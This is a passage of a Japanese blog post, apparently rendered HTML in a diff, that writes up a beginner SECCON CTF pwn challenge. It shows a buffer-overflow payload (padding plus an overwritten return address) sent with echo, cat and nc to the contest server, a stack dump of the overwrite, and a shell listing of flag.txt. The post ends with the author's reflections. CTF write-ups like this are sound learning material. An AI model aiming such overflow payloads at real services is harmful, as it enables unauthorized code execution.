+                   </span><span style="color:#bf616a;">+--------------------+
+
+Congratulations!
+</span></pre>
+<p>　え・・・・？リターンアドレスを<code>0x400861</code>から<code>0x400862</code>に変えただけですよ・・・？よくわからないけどこれでフラグゲットやったーと思いながら、問題サーバーに接続して攻撃してみたらやっぱり Conglaturations! と出てくれました。あれ、もしかして私天才・・・？なんて思ってフラグが出てくるのを今か今かと待っていましたがでてきません。怒涛の<code>ls</code>連打をしても何も起きません。  解法が違うのかと思って調べたりして頑張っていましたが、3時間やっても何も進捗がないので泣きながら寝てしまいました。<br />
+　CTF 終了後に Twitter にて解決策をさかいたにしんじろうさん(<code>@shin2ro_o</code>)に教えて頂いたのですが、どうやらパイプで標準有力を渡すのがだめだったみたいです。一度文字列をファイルに書き込んでから、それを<code>cat</code>した結果を<code>nc</code>に渡してあげると、Congulatirations! の後に<code>ls</code>、<code>cat</code>で無事 flag を見つける事ができました。</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> echo</span><span style="color:#bf616a;"> -e </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x62\x08\x40\x00\x00\x00\x00\x00</span><span style="color:#c0c5ce;">&#39; &gt; input.txt
+</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> cat input.txt - | </span><span style="color:#bf616a;">nc</span><span style="color:#c0c5ce;"> bs.quals.beginners.seccon.jp 9001
+</span><span style="color:#bf616a;">Your</span><span style="color:#c0c5ce;"> goal is to call `</span><span style="color:#bf616a;">win</span><span style="color:#c0c5ce;">` function (located at 0x400861)
+
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61600 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007faa73b589a0 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61608 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000000 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61610 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000000 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61618 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007faa73d71170 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61620 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007ffcd3c61630 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61628 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x000000000040084e </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61630 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61638 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007faa73778b97 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61640 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000001 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61648 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007ffcd3c61718 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+
+Input:
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61600 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61608 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61610 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61618 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61620 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61628 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400862 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61630 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400a0a </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61638 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007faa73778b97 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61640 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000001 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffcd3c61648 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007ffcd3c61718 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+
+Congratulations!
+ls
+chall
+flag.txt
+redir.sh
+</span></pre>
+<p>　flag.txt を<code>cat</code>で見てあげるとフラグが出てきました。<br>　
+　これで一件落着しましたが、「Conglatulations! と出た後にコマンドを打つ」という考え競技中は思い浮かばなかったので、やっぱり自分の力不足だったのかなと思っています。他の pwn の問題も解いて、理解を深めたいところです。</p>
+<h2 id="gan-xiang">感想</h2>
+<p>　はじめての ctf はなかなかうまくいかないことが多かったですが、ctf の雰囲気や楽しさなどを知ることができ、とても良い経験になりました。ずっと競プロばかりしていましたが、この機会に ctf にも積極的に参加していきたいなと思います。次はもっとチームに貢献できるよう頑張りたいです。</p>
+
+    </div>
+
+    
+    
+
+    <div class="post-footer">
+        
+            
+            
+                <div class="post-nav">
+                    
+                        <a class="previous" href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;about-string&#x2F;">‹ rust の String をよく知らなくてコンテストで爆死したお話</a>
+                    
+                    
+                    
+                    
+                </div>
+            
+
+        
+
+    </div>
+
+    
+    
+</article>
+
+
+            </div>
+        </main>
+
+        
+        
+    </div>
+
+    
+    <script type="text/javascript" src="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;even.js"></script>
+    
+</body>
+
+</html>
